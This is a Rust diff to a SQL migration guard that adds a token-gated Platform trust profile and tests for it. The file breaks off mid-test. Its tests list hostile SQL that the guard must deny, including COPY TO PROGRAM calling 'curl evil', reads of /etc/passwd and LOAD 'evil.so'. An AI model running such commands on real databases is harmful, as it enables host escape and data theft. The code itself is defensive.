@@ -32,18 +32,251 @@ use crate::migration::MigrationFlags;
 use denylist::rule;
 use serde_json::Value;
 
-/// Per-project guard configuration.
+/// The trust posture of a guard. Set at the OPERATOR CALL SITE, never derived
+/// from SQL content (design §4.1 / §5).
+///
+/// The EXTERNAL trust boundary is closed by construction, but NOT by enum
+/// un-nameability (the design doc §4.1/§5 overclaims that — `#[non_exhaustive]`
+/// only forbids *exhaustive matching* and *constructing fielded variants*
+/// externally; an external crate CAN still name the fieldless `Platform` as a
+/// value). The real external lock is that [`GuardConfig`]'s fields are PRIVATE
+/// and [`GuardConfig::platform`] is `pub(crate)` and requires a `pub(crate)`
+/// [`PlatformCapability`] token: so naming `TrustProfile::Platform` externally
+/// is *harmless* — there is no `pub` API that accepts it and no way to build a
+/// Platform `GuardConfig`. Within the crate, `Platform` is produced ONLY inside
+/// [`GuardConfig::platform`] / [`crate::db::ExecutorConfig::platform`], each of
+/// which REQUIRES the token (below) — so in-crate code (`submit`/`engine`)
+/// cannot mint it either without holding the token (§5). `#[non_exhaustive]`
+/// remains valuable: it keeps the variant set evolvable and forces external
+/// matches to carry a wildcard.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[non_exhaustive]
+pub enum TrustProfile {
+    /// Untrusted creator/AI SQL. The full deny-list (today's behaviour).
+    Confined,
+    /// Trusted operator SQL for the platform schemas. Constructed ONLY by
+    /// `GuardConfig::platform` / `ExecutorConfig::platform`, which require a
+    /// [`PlatformCapability`] token.
+    Platform,
+}
+
+/// The schemas a guard permits references to (design §4.1).
+///
+/// `Single` is the **Confined** shape — byte-identical to today's
+/// `project_schema: String` semantics (one allowed schema; everything else is a
+/// `CrossSchema` violation). `Allowlist` is the **Platform** shape: a reference
+/// passes iff its schema is a member of the allowlist.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum SchemaScope {
+    /// Confined: exactly one permitted schema (the project schema). Any other
+    /// explicitly-qualified schema is a cross-tenant violation.
+    Single(String),
+    /// Platform: a set of permitted schemas (e.g. `zeroship` / `oauth_hydra` /
+    /// `public`). A reference is foreign iff its schema is NOT in this list.
+    Allowlist(Vec<String>),
+}
+
+impl SchemaScope {
+    /// True if `schema` is permitted by this scope (case-insensitive).
+    ///
+    /// - `Single(s)` ⇒ `schema == s` (byte-identical to the old
+    ///   `project_schema` equality test).
+    /// - `Allowlist(v)` ⇒ `schema ∈ v`.
+    #[must_use]
+    pub fn permits(&self, schema: &str) -> bool {
+        match self {
+            Self::Single(s) => schema.eq_ignore_ascii_case(s),
+            Self::Allowlist(v) => v.iter().any(|s| s.eq_ignore_ascii_case(schema)),
+        }
+    }
+}
+
+/// The in-crate enforcement primitive for the Platform profile (design §4.1,
+/// HIGH-1). A zero-sized capability token whose ONLY constructor (`new`) is
+/// private to the [`platform_runner`] submodule.
+///
+/// [`GuardConfig::platform`] and [`crate::db::ExecutorConfig::platform`] take a
+/// `&PlatformCapability`, so the ability to produce `Platform` is gated on
+/// *holding a token you can only get inside `platform_runner`* — not on a
+/// `pub(crate)` function any in-crate module could call. This is what upgrades
+/// the in-crate trust story from "reviewed convention" to "by construction":
+/// `submit`/`engine`/`executor`/… cannot mint a token, so they cannot mint
+/// Platform. The TYPE is re-exported crate-wide (so `platform()` can name it in
+/// its signature); the constructor is NOT.
+pub(crate) mod platform_runner {
+    /// A zero-sized Platform capability token. Its `new()` is `pub(super)`, so
+    /// only this submodule can mint it (the CLI / compose `migrate` entrypoint
+    /// — Phase 3 — will live here and be the only real caller).
+    ///
+    /// `Clone` is sound: it is a ZST and cloning does not widen authority — you
+    /// can only clone a token you *already hold*, and you can only hold one by
+    /// minting it here. It rides on a Platform-built [`super::GuardConfig`] /
+    /// [`crate::db::ExecutorConfig`] so the executor's internal guard builds can
+    /// re-derive a Platform `GuardConfig` without a fresh out-of-band mint.
+    #[derive(Debug, Clone)]
+    pub struct PlatformCapability(());
+
+    impl PlatformCapability {
+        /// The single mint site, private to this submodule.
+        ///
+        /// Phase 1 has no CLI yet; this is exercised by the in-crate T11 test
+        /// seam below and will be called by the CLI `migrate`/`status`/
+        /// `validate`/`rollback` entrypoints in Phase 3 (hence `dead_code` in a
+        /// non-test build until that caller lands).
+        #[cfg_attr(not(test), allow(dead_code))]
+        pub(super) fn new() -> Self {
+            PlatformCapability(())
+        }
+
+        /// **Test-only `pub(crate)` seam (Phase 1).** Lets in-crate tests
+        /// exercise the Platform profile before the CLI exists. This is the
+        /// ONLY way any module other than `platform_runner` can obtain a token,
+        /// and it is `#[cfg(test)]`-gated so it does not exist in a release
+        /// build — the production mint site stays the `pub(super)` `new` above.
+        #[cfg(test)]
+        #[must_use]
+        pub(crate) fn for_test() -> Self {
+            Self::new()
+        }
+    }
+}
+
+pub(crate) use platform_runner::PlatformCapability;
+
+/// Per-guard configuration (design §4.1).
+///
+/// All fields are **private**: a `GuardConfig` is obtained ONLY through
+/// [`GuardConfig::confined`] (the safe default anyone may construct) or
+/// [`GuardConfig::platform`] (requires a [`PlatformCapability`] token). This is
+/// what makes the §5 trust invariant statically true — an external crate cannot
+/// write a `GuardConfig { trust: Platform, .. }` literal, and no in-crate module
+/// can produce `Platform` without the token.
 #[derive(Debug, Clone)]
 pub struct GuardConfig {
-    /// The one schema this project's migrations may touch. Any explicitly
-    /// schema-qualified reference to a *different* schema is a cross-tenant
-    /// violation.
-    pub project_schema: String,
-    /// Extensions this project is permitted to `CREATE EXTENSION`. Anything
-    /// not listed is denied (deny-by-default), and the [`denylist`]'s
-    /// `FORBIDDEN_EXTENSIONS` are denied even if mistakenly listed here.
-    pub extension_allowlist: Vec<String>,
+    /// PRIVATE. The trust posture. Settable only through `confined()`/`platform()`.
+    trust: TrustProfile,
+    /// PRIVATE. The schemas this guard permits references to. Confined ⇒
+    /// `Single(project_schema)`; Platform ⇒ `Allowlist([...])`.
+    schemas: SchemaScope,
+    /// PRIVATE. `CREATE EXTENSION` allowlist (the [`denylist`]'s
+    /// `FORBIDDEN_EXTENSIONS` still override it in BOTH profiles). Private so
+    /// the only way to obtain a non-empty allowlist is `platform()` or the
+    /// Confined builder [`GuardConfig::with_extension_allowlist`].
+    extension_allowlist: Vec<String>,
 }
+
+impl GuardConfig {
+    /// The ONLY constructor reachable from the submission ingress and every
+    /// creator-path author. Always `Confined`, single-schema, empty extensions.
+    /// Needs NO token — Confined is the safe default anyone may construct.
+    #[must_use]
+    pub fn confined(project_schema: impl Into<String>) -> Self {
+        Self {
+            trust: TrustProfile::Confined,
+            schemas: SchemaScope::Single(project_schema.into()),
+            extension_allowlist: Vec::new(),
+        }
+    }
+
+    /// Confined-path builder: set the `CREATE EXTENSION` allowlist. The creator
+    /// path legitimately carries a per-project extension allowlist (e.g. the
+    /// declarative author at `author.rs`), and a non-empty allowlist is NOT a
+    /// privilege escalation — `FORBIDDEN_EXTENSIONS` still override it and the
+    /// trust posture stays `Confined`. Platform configs set their allowlist via
+    /// [`GuardConfig::platform`] instead.
+    #[must_use]
+    pub fn with_extension_allowlist(mut self, extensions: Vec<String>) -> Self {
+        self.extension_allowlist = extensions;
+        self
+    }
+
+    /// Platform profile. REQUIRES a [`PlatformCapability`] token (mintable only
+    /// in `platform_runner`), so neither an external crate (cannot name
+    /// `Platform` nor construct the token) NOR an in-crate module (cannot
+    /// construct the token) can produce a Platform guard outside the operator
+    /// runner. The `_cap` arg is the in-crate enforcement; `#[non_exhaustive]`
+    /// on [`TrustProfile`] is the external enforcement. This is the single place
+    /// `TrustProfile::Platform` is named.
+    #[must_use]
+    pub(crate) fn platform(
+        _cap: &PlatformCapability,
+        schemas: Vec<String>,
+        extension_allowlist: Vec<String>,
+    ) -> Self {
+        Self {
+            trust: TrustProfile::Platform,
+            schemas: SchemaScope::Allowlist(schemas),
+            extension_allowlist,
+        }
+    }
+
+    /// The trust posture the guard internals consult.
+    #[must_use]
+    pub(crate) fn trust(&self) -> TrustProfile {
+        self.trust
+    }
+}
+
+impl Default for GuardConfig {
+    /// Confined, empty single-schema, empty extensions — today's behaviour.
+    fn default() -> Self {
+        Self::confined(String::new())
+    }
+}
+
+/// T8 — the EXTERNAL trust boundary, pinned as `compile_fail` doctests (design
+/// §5 / §12 T8). A doctest is compiled as a SEPARATE crate that `use`s
+/// `zeroship_migrate`, so it exercises exactly the external boundary the control
+/// plane / builder sit behind. Each snippet below MUST fail to compile.
+///
+/// (1) An external crate cannot write a `GuardConfig { .. }` struct literal —
+/// the fields are private:
+///
+/// ```compile_fail
+/// use zeroship_migrate::guard::{GuardConfig, TrustProfile, SchemaScope};
+/// let _ = GuardConfig {
+///     trust: TrustProfile::Platform,
+///     schemas: SchemaScope::Allowlist(vec!["zeroship".into()]),
+///     extension_allowlist: vec![],
+/// };
+/// ```
+///
+/// (2) `TrustProfile` is `#[non_exhaustive]`, so an external crate cannot
+/// exhaustively match it (it must add a wildcard) — it can never assume it has
+/// seen every variant, and cannot construct a future fielded variant. (NOTE:
+/// `#[non_exhaustive]` does NOT make naming an existing fieldless variant like
+/// `Platform` a compile error — naming it is harmless because the external
+/// boundary is enforced by the PRIVATE `GuardConfig` fields + the `pub(crate)`
+/// `platform()` ctor + the `pub(crate)` token, snippets (1) and (3), not by
+/// un-nameability of the variant.)
+///
+/// ```compile_fail
+/// use zeroship_migrate::guard::TrustProfile;
+/// fn _exhaustive(t: TrustProfile) -> u8 {
+///     match t {
+///         TrustProfile::Confined => 0,
+///         TrustProfile::Platform => 1,
+///         // no wildcard arm — rejected because the enum is #[non_exhaustive].
+///     }
+/// }
+/// ```
+///
+/// (3) …nor even NAME the `PlatformCapability` token type (it is `pub(crate)`,
+/// so it does not exist in the external crate's view of the module):
+///
+/// ```compile_fail
+/// use zeroship_migrate::guard::PlatformCapability;
+/// fn _needs_a_token(_c: &PlatformCapability) {}
+/// ```
+///
+/// For contrast, the safe Confined constructor IS reachable externally:
+///
+/// ```
+/// use zeroship_migrate::guard::GuardConfig;
+/// let _ = GuardConfig::confined("proj_acme");
+/// ```
+#[cfg(doctest)]
+struct ExternalTrustBoundaryCompileFail;
 
 /// A guard rejection.
 #[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
@@ -219,18 +452,30 @@ impl SqlGuard {
                 // Plain COPY … TO STDOUT / FROM STDIN — safe.
                 return Ok(());
             }
-            // ALTER SYSTEM — cluster-wide config, always denied.
+            // ALTER SYSTEM — cluster-wide config, always denied (BOTH profiles).
             NodeEnum::AlterSystemStmt(_) => return Err(denied(rule::ALTER_SYSTEM, raw)),
-            // Role management — privilege escalation.
+            // Role management — privilege escalation. ALLOW iff Platform (§4.1):
+            // the platform schema migrations must CREATE/ALTER/DROP roles and
+            // pin their search_path (0025/0027). Confined still hard-denies.
             NodeEnum::CreateRoleStmt(_)
             | NodeEnum::AlterRoleStmt(_)
             | NodeEnum::AlterRoleSetStmt(_)
-            | NodeEnum::DropRoleStmt(_) => return Err(denied(rule::ROLE_MANAGEMENT, raw)),
+            | NodeEnum::DropRoleStmt(_) => {
+                if self.cfg.trust() == TrustProfile::Platform {
+                    return Ok(());
+                }
+                return Err(denied(rule::ROLE_MANAGEMENT, raw));
+            }
             // GRANT / REVOKE / role-membership grants — privilege management.
+            // ALLOW iff Platform (§4.1): the platform schema migrations grant
+            // CONNECT/USAGE/etc. (0025/0027). Confined still hard-denies.
             NodeEnum::GrantStmt(_)
             | NodeEnum::GrantRoleStmt(_)
             | NodeEnum::AlterDefaultPrivilegesStmt(_) => {
-                return Err(denied(rule::PRIVILEGE_MANAGEMENT, raw))
+                if self.cfg.trust() == TrustProfile::Platform {
+                    return Ok(());
+                }
+                return Err(denied(rule::PRIVILEGE_MANAGEMENT, raw));
             }
             // Database / FDW management — out of a project migrator's remit.
             NodeEnum::CreatedbStmt(_)
@@ -319,18 +564,54 @@ impl SqlGuard {
             NodeEnum::AlterTableStmt(at) => {
                 // ALTER TABLE is safe ONLY for the enumerated subcommand set;
                 // OWNER TO / INHERIT / REPLICA IDENTITY / generic-options are
-                // out of remit and denied.
-                Self::check_alter_table_cmds(at, raw)?;
+                // out of remit and denied. Under Platform the four RLS subtypes
+                // (ENABLE/FORCE/NO FORCE/DISABLE ROW LEVEL SECURITY) are also
+                // admitted (§4.1; 0025).
+                self.check_alter_table_cmds(at, raw)?;
             }
             NodeEnum::DropStmt(d) => {
-                // DROP is safe only for the enumerated object types; DROP ROLE
-                // (etc.) via the DropStmt spelling is denied.
+                let platform = self.cfg.trust() == TrustProfile::Platform;
+                // DROP ROLE via the DropStmt spelling — ALLOW iff Platform
+                // (§4.1; the `.down.sql` reverse of CREATE ROLE), else deny.
                 if d.remove_type == ObjectType::ObjectRole as i32 {
+                    if platform {
+                        return Ok(());
+                    }
                     return Err(denied(rule::ROLE_MANAGEMENT, raw));
                 }
-                if !is_safe_drop_object(d.remove_type) {
+                // DROP is safe only for the enumerated object types. Under
+                // Platform the extra set (schema/extension/policy — the
+                // `.down.sql`-only reverses) is also admitted (§4.1).
+                let drop_allowed = is_safe_drop_object(d.remove_type)
+                    || (platform && is_platform_drop_object(d.remove_type));
+                if !drop_allowed {
                     return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
                 }
+            }
+            // CREATE SCHEMA — deny-by-default for Confined; ALLOW iff Platform
+            // (§4.1; 0001/0027 create the platform/oauth_hydra schemas). When
+            // Platform, fall through to the cross-schema confinement below (the
+            // schema being created is checked against the allowlist there).
+            NodeEnum::CreateSchemaStmt(_) => {
+                if self.cfg.trust() != TrustProfile::Platform {
+                    return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
+                }
+            }
+            // CREATE POLICY (RLS) — deny-by-default for Confined; ALLOW iff
+            // Platform (§4.1; 0025 RLS policies). When Platform, fall through;
+            // cross-schema confinement on the policy's table still runs below.
+            NodeEnum::CreatePolicyStmt(_) => {
+                if self.cfg.trust() != TrustProfile::Platform {
+                    return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
+                }
+            }
+            // DROP OWNED BY <role> — deny-by-default for Confined; ALLOW iff
+            // Platform (§4.1; 0025 rollback DO-block).
+            NodeEnum::DropOwnedStmt(_) => {
+                if self.cfg.trust() == TrustProfile::Platform {
+                    return Ok(());
+                }
+                return Err(denied(rule::UNRECOGNIZED_DANGEROUS, raw));
             }
             NodeEnum::TransactionStmt(t) => {
                 // BEGIN/START/COMMIT/ROLLBACK/SAVEPOINT/RELEASE/ROLLBACK TO are
@@ -375,14 +656,19 @@ impl SqlGuard {
         Ok(())
     }
 
-    /// Reject `ALTER TABLE` subcommands outside the safe migration set.
+    /// Reject `ALTER TABLE` subcommands outside the safe migration set. Under
+    /// Platform the four RLS subtypes are additionally admitted (§4.1).
     fn check_alter_table_cmds(
+        &self,
         at: &protobuf::AlterTableStmt,
         raw: &str,
     ) -> Result<(), GuardError> {
+        let platform = self.cfg.trust() == TrustProfile::Platform;
         for cmd in &at.cmds {
             if let Some(NodeEnum::AlterTableCmd(c)) = cmd.node.as_ref() {
-                if !is_safe_alter_table_subtype(c.subtype) {
+                let subtype_allowed = is_safe_alter_table_subtype(c.subtype)
+                    || (platform && is_platform_alter_table_subtype(c.subtype));
+                if !subtype_allowed {
                     return Err(denied(rule::UNSAFE_ALTER_TABLE_CMD, raw));
                 }
             }
@@ -393,7 +679,7 @@ impl SqlGuard {
     /// Deny any explicit reference to a schema other than the project schema,
     /// found ANYWHERE in the full parse tree (Root Cause 2 fix).
     fn check_cross_schema(&self, json: &Value, raw: &str) -> Result<(), GuardError> {
-        if let Some(schema) = foreign_schema_in_tree(json, &self.cfg.project_schema) {
+        if let Some(schema) = foreign_schema_in_tree(json, &self.cfg.schemas) {
             return Err(GuardError::CrossSchema {
                 schema,
                 statement: raw.to_string(),
@@ -424,7 +710,7 @@ impl SqlGuard {
             .collect();
         if parts.len() >= 2 {
             let schema = parts[0];
-            if !schema.eq_ignore_ascii_case(&self.cfg.project_schema) {
+            if !self.cfg.schemas.permits(schema) {
                 return Err(GuardError::CrossSchema {
                     schema: schema.to_string(),
                     statement: raw.to_string(),
@@ -543,7 +829,7 @@ impl SqlGuard {
                     None => return false,
                 }
             };
-            if schema.eq_ignore_ascii_case(&self.cfg.project_schema) {
+            if self.cfg.schemas.permits(&schema) {
                 return false;
             }
             // Concrete object target — Object-slot policy: no shared-schema
@@ -675,12 +961,26 @@ impl SqlGuard {
             }
         }
         // search_path escape / alter system / role mgmt hidden in EXECUTE text.
-        for needle in ["alter system", "create role", "create user", "drop role"] {
+        // Under Platform (§4.2) the role-management + search_path needles are
+        // relaxed — 0025's bootstrap DO-block legitimately EXECUTEs
+        // `CREATE ROLE …` / `ALTER ROLE … SET search_path …` — but `ALTER
+        // SYSTEM` STAYS hard in BOTH profiles (it has no place in any
+        // migration). The recursion arm (a) has already admitted the genuinely
+        // parsed CREATE ROLE / GRANT nodes under Platform; this token scan is
+        // the lexical backstop, so relaxing exactly these needles is the
+        // surgical change.
+        let platform = self.cfg.trust() == TrustProfile::Platform;
+        let needles: &[&str] = if platform {
+            &["alter system"]
+        } else {
+            &["alter system", "create role", "create user", "drop role"]
+        };
+        for needle in needles {
             if lower.contains(needle) {
                 return Err(denied(rule::BODY_INSPECTION, raw));
             }
         }
-        if lower.contains("search_path") {
+        if !platform && lower.contains("search_path") {
             return Err(denied(rule::BODY_INSPECTION, raw));
         }
         // COPY … PROGRAM hidden in a body.
@@ -698,7 +998,7 @@ impl SqlGuard {
         //     project schema is a cross-tenant reference the body re-parse
         //     could not surface (PL/pgSQL BEGIN/END wrappers don't parse as
         //     plain SQL). Deny-by-default.
-        if let Some(schema) = foreign_schema_in_body(body, &self.cfg.project_schema) {
+        if let Some(schema) = foreign_schema_in_body(body, &self.cfg.schemas) {
             return Err(GuardError::CrossSchema {
                 schema,
                 statement: raw.to_string(),
@@ -713,7 +1013,7 @@ impl SqlGuard {
         //     that is not the project schema (reaching ANOTHER project's
         //     schema). Deny-by-default for the dynamic-SQL class.
         if let Some(schema) =
-            foreign_schema_literal_in_body(body, &self.cfg.project_schema)
+            foreign_schema_literal_in_body(body, &self.cfg.schemas)
         {
             return Err(GuardError::CrossSchema {
                 schema,
@@ -735,22 +1035,25 @@ impl SqlGuard {
 ///   2. If the body uses an `%I` identifier-format template (the tell of
 ///      dynamic schema/relation interpolation), any bare *identifier* literal
 ///      that is not the project schema — reaching another project's schema.
-fn foreign_schema_literal_in_body(body: &str, project_schema: &str) -> Option<String> {
+fn foreign_schema_literal_in_body(body: &str, scope: &SchemaScope) -> Option<String> {
     let uses_ident_template = body.to_ascii_lowercase().contains("%i");
     for literal in extract_string_literals(body) {
         let lit = literal.trim();
-        // (1) platform schema named directly.
-        if denylist::list_contains_ci(denylist::PLATFORM_SCHEMAS, lit)
-            && !lit.eq_ignore_ascii_case(project_schema)
-        {
+        // A schema the scope permits is never a violation. Under `Single(s)`
+        // this is `lit == s` (byte-identical to the old `project_schema`
+        // exclusion); under `Allowlist` an operator-supplied schema is exempt.
+        if scope.permits(lit) {
+            continue;
+        }
+        // (1) platform schema named directly. The `PLATFORM_SCHEMAS` lexical
+        //     backstop fires for any schema in PLATFORM_SCHEMAS that the scope
+        //     did NOT permit (port schemas `zeroship`/`oauth_hydra`/`public`
+        //     are not in PLATFORM_SCHEMAS, so they already pass — §4.2/HIGH-3).
+        if denylist::list_contains_ci(denylist::PLATFORM_SCHEMAS, lit) {
             return Some(lit.to_string());
         }
         // (2) bare identifier reaching another schema under an %I template.
-        if uses_ident_template
-            && !lit.eq_ignore_ascii_case(project_schema)
-            && is_bare_identifier(lit)
-            && looks_like_schema_name(lit)
-        {
+        if uses_ident_template && is_bare_identifier(lit) && looks_like_schema_name(lit) {
             return Some(lit.to_string());
         }
     }
@@ -792,7 +1095,7 @@ fn looks_like_schema_name(s: &str) -> bool {
 /// project's own role/pinned-search_path is the runtime confinement for the
 /// rest. `project_schema` is excluded so a project legitimately naming its own
 /// schema in a body is fine.
-fn foreign_schema_in_body(body: &str, project_schema: &str) -> Option<String> {
+fn foreign_schema_in_body(body: &str, scope: &SchemaScope) -> Option<String> {
     let bytes = body.as_bytes();
     let mut i = 0;
     while i < bytes.len() {
@@ -805,7 +1108,11 @@ fn foreign_schema_in_body(body: &str, project_schema: &str) -> Option<String> {
             }
             if bytes.get(i + 1).copied().is_some_and(is_ident_byte) {
                 let schema = &body[s..i];
-                if !schema.eq_ignore_ascii_case(project_schema)
+                // A scope-permitted schema is never a violation (`Single(s)` ⇒
+                // `schema == s`, byte-identical to the old exclusion). The
+                // `PLATFORM_SCHEMAS` backstop fires for any non-permitted schema
+                // in PLATFORM_SCHEMAS (the port schemas are not in it — HIGH-3).
+                if !scope.permits(schema)
                     && denylist::list_contains_ci(denylist::PLATFORM_SCHEMAS, schema)
                 {
                     return Some(schema.to_string());
@@ -892,6 +1199,36 @@ fn is_safe_drop_object(remove_type: i32) -> bool {
     ]
     .iter()
     .any(|t| remove_type == *t as i32)
+}
+
+/// The additional `ObjectType`s a **Platform** migration may `DROP` beyond
+/// [`is_safe_drop_object`] (design §4.1, the `.down.sql`-only reverses): role,
+/// schema, extension, policy. Confined never admits these.
+fn is_platform_drop_object(remove_type: i32) -> bool {
+    [
+        ObjectType::ObjectRole,
+        ObjectType::ObjectSchema,
+        ObjectType::ObjectExtension,
+        ObjectType::ObjectPolicy,
+    ]
+    .iter()
+    .any(|t| remove_type == *t as i32)
+}
+
+/// The additional `AlterTableType` subtypes a **Platform** migration may use
+/// beyond [`is_safe_alter_table_subtype`] (design §4.1): the four RLS toggles
+/// (ENABLE / FORCE / NO FORCE / DISABLE ROW LEVEL SECURITY). Confined never
+/// admits these.
+fn is_platform_alter_table_subtype(subtype: i32) -> bool {
+    use AlterTableType as A;
+    [
+        A::AtEnableRowSecurity,
+        A::AtForceRowSecurity,
+        A::AtNoForceRowSecurity,
+        A::AtDisableRowSecurity,
+    ]
+    .iter()
+    .any(|t| subtype == *t as i32)
 }
 
 /// The `AlterTableType` subcommands a creator migration may use. OWNER TO,
@@ -1473,10 +1810,10 @@ fn regproc_leading_ident(lit: &str) -> &str {
 /// (`public.evil`, `pg_catalog.evil`, `information_schema.evil` all denied).
 ///
 /// Returns the first foreign schema found.
-fn foreign_schema_in_tree(v: &Value, project_schema: &str) -> Option<String> {
+fn foreign_schema_in_tree(v: &Value, scope: &SchemaScope) -> Option<String> {
     let mut found: Option<String> = None;
     walk_schema_names(v, &mut |schema, slot| {
-        if schema.is_empty() || schema.eq_ignore_ascii_case(project_schema) {
+        if schema.is_empty() || scope.permits(schema) {
             return false;
         }
         if slot_exempts_schema(slot, schema) {
@@ -1862,4 +2199,262 @@ fn stmt_text(sql: &str, raw_stmt: &protobuf::RawStmt) -> String {
     let len = usize::try_from(raw_stmt.stmt_len).unwrap_or(0);
     let end = if len == 0 { sql.len() } else { (start + len).min(sql.len()) };
     sql.get(start..end).unwrap_or("").trim().to_string()
+}
+
+// ===========================================================================
+// In-crate tests — these MUST live in-crate because `PlatformCapability::for_test`
+// and `GuardConfig::platform` are `pub(crate)` (the external trust boundary is
+// pinned separately by the `tests/trybuild_*` compile-fail tests, T8).
+//
+// Coverage map:
+//   T11  — capability minting is `platform_runner`-only (the in-crate seam).
+//   T4   — Platform widening is correct AND bounded (privileged constructs pass;
+//          RCE/host-escape/cross-schema-to-creator still denied).
+//   T4b  — DO-block privileged DDL applies under Platform; the RCE token-scan
+//          stays hard even under Platform; the same blocks deny under Confined.
+//   T2   — the SchemaScope swap is byte-identical under Single for the
+//          func-def-target + literal-schema-ref read sites.
+// ===========================================================================
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// A Platform guard over the real port allowlist (`zeroship` / `oauth_hydra`
+    /// / `public`) + the two ported extensions. Minted via the `for_test` seam
+    /// — the ONLY non-`platform_runner` path to a token, `#[cfg(test)]`-only.
+    fn platform_guard() -> SqlGuard {
+        let cap = PlatformCapability::for_test();
+        SqlGuard::new(GuardConfig::platform(
+            &cap,
+            vec![
+                "zeroship".to_string(),
+                "oauth_hydra".to_string(),
+                "public".to_string(),
+            ],
+            vec!["citext".to_string(), "uuid-ossp".to_string()],
+        ))
+    }
+
+    fn confined_guard() -> SqlGuard {
+        SqlGuard::new(GuardConfig::confined("zeroship"))
+    }
+
+    fn is_denied(g: &SqlGuard, sql: &str) -> bool {
+        matches!(
+            g.check(sql),
+            Err(GuardError::Denied { .. } | GuardError::CrossSchema { .. })
+        )
+    }
+
+    // ---- T11: capability minting is platform_runner-only -------------------
+
+    /// The capability type is constructible from the in-crate test seam (proving
+    /// `platform_runner` can mint it) — and the doc/`pub(super)` `new` is the
+    /// production mint. No other module has a path to `new()`: the `for_test`
+    /// seam is `#[cfg(test)]`-gated and the production `new` is `pub(super)`.
+    #[test]
+    fn t11_platform_capability_mints_only_via_runner_seam() {
+        let cap = PlatformCapability::for_test();
+        // The token grants a Platform GuardConfig + ExecutorConfig.
+        let gcfg = GuardConfig::platform(&cap, vec!["zeroship".into()], vec![]);
+        assert_eq!(gcfg.trust(), TrustProfile::Platform);
+        let ecfg = crate::db::ExecutorConfig::platform(
+            &cap,
+            "platform",
+            "zeroship",
+            vec!["zeroship".into()],
+            vec![],
+        );
+        assert_eq!(ecfg.guard_config().trust(), TrustProfile::Platform);
+        // NOTE: `PlatformCapability::new` is `pub(super)` to `platform_runner`,
+        // so NO sibling module (incl. this test) can call it directly — only
+        // the `#[cfg(test)] for_test` seam, which delegates to it, is reachable.
+        // The external un-nameability is pinned by tests/trybuild_* (T8).
+    }
+
+    // ---- T4: Platform widening is correct AND bounded ----------------------
+
+    #[test]
+    fn t4_platform_allows_privileged_constructs() {
+        let g = platform_guard();
+        let allowed = [
+            // role mgmt
+            "CREATE ROLE zeroship_auth NOLOGIN",
+            "ALTER ROLE oauth_hydra SET search_path = oauth_hydra, public",
+            "ALTER ROLE oauth_hydra RESET search_path",
+            "DROP ROLE IF EXISTS oauth_hydra",
+            // grant / privilege mgmt
+            "GRANT CONNECT ON DATABASE zeroship TO oauth_hydra",
+            "GRANT USAGE ON SCHEMA public TO oauth_hydra",
+            "REVOKE USAGE ON SCHEMA public FROM oauth_hydra",
+            "ALTER DEFAULT PRIVILEGES IN SCHEMA zeroship GRANT SELECT ON TABLES TO zeroship_app",
+            // schema
+            "CREATE SCHEMA IF NOT EXISTS oauth_hydra AUTHORIZATION oauth_hydra",
+            "DROP SCHEMA IF EXISTS oauth_hydra CASCADE",
+            // RLS — the four toggles
+            "ALTER TABLE zeroship.app_secrets ENABLE ROW LEVEL SECURITY",
+            "ALTER TABLE zeroship.app_secrets FORCE ROW LEVEL SECURITY",
+            "ALTER TABLE zeroship.app_secrets NO FORCE ROW LEVEL SECURITY",
+            "ALTER TABLE zeroship.app_secrets DISABLE ROW LEVEL SECURITY",
+            // policy
+            "CREATE POLICY tenant_isolation ON zeroship.app_secrets \
+             USING (app_id = current_setting('zeroship.tenant_app', true)::uuid)",
+            "DROP POLICY IF EXISTS tenant_isolation ON zeroship.app_secrets",
+            // extensions (allowlisted under Platform)
+            "CREATE EXTENSION citext",
+            "CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\" WITH SCHEMA oauth_hydra",
+            "DROP EXTENSION IF EXISTS \"uuid-ossp\"",
+            // DROP OWNED BY (0025 rollback)
+            "DROP OWNED BY zeroship_auth",
+            // cross-schema references within the allowlist
+            "CREATE TABLE oauth_hydra.clients(id int primary key)",
+            "INSERT INTO public.t SELECT * FROM zeroship.app_secrets",
+        ];
+        for sql in allowed {
+            assert!(
+                g.check(sql).is_ok(),
+                "Platform should ALLOW but DENIED: {sql}\n  got: {:?}",
+                g.check(sql)
+            );
+        }
+    }
+
+    #[test]
+    fn t4_platform_still_denies_rce_and_host_escape() {
+        let g = platform_guard();
+        let denied = [
+            // RCE / host escape — kept hard in BOTH profiles
+            "COPY zeroship.t TO PROGRAM 'sh -c \"curl evil\"'",
+            "COPY zeroship.t FROM '/etc/passwd'",
+            "SELECT pg_read_file('/etc/passwd')",
+            "CREATE EXTENSION dblink",
+            "CREATE EXTENSION postgres_fdw",
+            "CREATE FUNCTION zeroship.f() RETURNS void AS 'x' LANGUAGE plpythonu",
+            "ALTER SYSTEM SET wal_level = minimal",
+            "CREATE FUNCTION zeroship.g() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$",
+            "LOAD 'evil.so'",
+            // cross-schema to a NON-allowlisted (creator) schema
+            "CREATE TABLE proj_acme.steal(id int)",
+            "INSERT INTO proj_acme.t SELECT * FROM zeroship.app_secrets",
+        ];
+        for sql in denied {
+            assert!(
+                is_denied(&g, sql),
+                "Platform should STILL DENY but it passed: {sql}\n  got: {:?}",
+                g.check(sql)
+            );
+        }
+    }
+
+    // ---- T4b: DO-block privileged DDL under Platform (C2 body widening) -----
+
+    /// 0025's bootstrap shape: a DO block whose EXECUTE literals CREATE ROLE /
+    /// ALTER ROLE … SET search_path / GRANT. ALLOWED under Platform (both the
+    /// recursion arm and the relaxed token-scan), DENIED under Confined.
+    const BOOTSTRAP_DO: &str = "DO $bootstrap$
+        BEGIN
+            EXECUTE 'CREATE ROLE zeroship_app NOLOGIN';
+            EXECUTE 'ALTER ROLE zeroship_app SET search_path = zeroship, public';
+            EXECUTE 'GRANT USAGE ON SCHEMA zeroship TO zeroship_app';
+        END
+        $bootstrap$;";
+
+    /// 0027's shape: a DO block with a bare (parsed) CREATE ROLE inside.
+    const HYDRA_DO: &str = "DO $$
+        BEGIN
+            IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'oauth_hydra') THEN
+                CREATE ROLE oauth_hydra LOGIN PASSWORD 'zeroship';
+            END IF;
+        END
+        $$;";
+
+    #[test]
+    fn t4b_do_block_privileged_ddl_applies_under_platform() {
